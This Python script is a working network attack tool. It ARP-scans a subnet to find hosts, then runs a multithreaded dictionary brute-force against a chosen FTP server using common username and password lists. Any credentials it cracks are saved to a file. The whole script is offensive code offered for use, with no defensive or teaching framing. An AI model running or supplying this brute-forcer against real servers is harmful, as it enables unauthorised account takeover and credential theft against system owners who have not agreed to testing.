
import ftplib
from threading import Thread
import queue
from scapy.all import srp, ARP, Ether
import os
import socket

attack_queue = queue.Queue()
max_threads = 30
ftp_port = 21

class ArpScanner:
    def Arp(self, subnet):
        self.subnet = subnet
        arp_request = ARP(pdst=subnet)
        broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
        request = broadcast/arp_request
        answered, unanswered = srp(request, timeout=1)
        print("Available hosts in the network:")
        print('\tIP\t\tHost')
        for ip in answered:
            ip = ip[1].psrc
            hostname = str(socket.gethostbyaddr(str(ip))).split("'")[1::2]
            print(ip, "\t", hostname[0])

class BruteForceAttack:
    global ftp_host
    arpScanner = ArpScanner()
    subnet = input("Enter Subnet Mask: ") #'172.21.0.0/24'
    arpScanner.Arp(subnet)
    ftp_host = input("Enter FTP server IP: ")

    def bruteForcePassword():
        global attack_queue, victim_user, victim_pass
        while True:
            creds = attack_queue.get()
            ftp_server = ftplib.FTP()
            ftp_usr = creds.split(":")[0]
            ftp_pass = creds.split(":")[1]
            print("Attacking ", ftp_usr, " with password: ", ftp_pass)
            try:
                ftp_server.connect(ftp_host, ftp_port, timeout=5)
                ftp_server.login(ftp_usr, ftp_pass)
            except ftplib.error_perm:
                pass
            except TimeoutError:
                pass
            else:
                victim_user = ftp_usr
                victim_pass = ftp_pass
                print("#"*40)
                print("Cracked ! Username: ", victim_user, " Password: ", victim_pass)
                print("#"*40)
                ftp_server.quit()
                crackfilename = "cracked_creds.txt"
                if os.path.exists(crackfilename):
                    os.remove(crackfilename)
                # else:
                    # print("####The file does not exist")

                crackfile = open(crackfilename, "a")
                cracked_creds = str(ftp_host) + ":" + str(ftp_port) + ":" + victim_user + ":" + victim_pass
                crackfile.write(cracked_creds)
                crackfile.close()
                crackfile = open(crackfilename, "r")
                print("crackfile: ", crackfile.read())
                crackfile.close()

                with attack_queue.mutex:
                    attack_queue.queue.clear()
                    attack_queue.all_tasks_done.notify_all()
                    attack_queue.unfinished_tasks = 0
                # print("done")
                
            finally:
                attack_queue.task_done()

    usernames = open("common_usernames.txt").read().split("\n")
    passwords = open("common_passwords.txt").read().split("\n")
    userlist = []
    for username in usernames:
        for password in passwords:
            creds = username + ":" + password
            userlist.append(creds)

    for cred in userlist:
        attack_queue.put(cred)

    for t in range(max_threads):
        attack_thread = Thread(target=bruteForcePassword)
        attack_thread.daemon = True
        attack_thread.start()

    attack_queue.join()
print("BruteForce Attack on FTP Server is Successful!")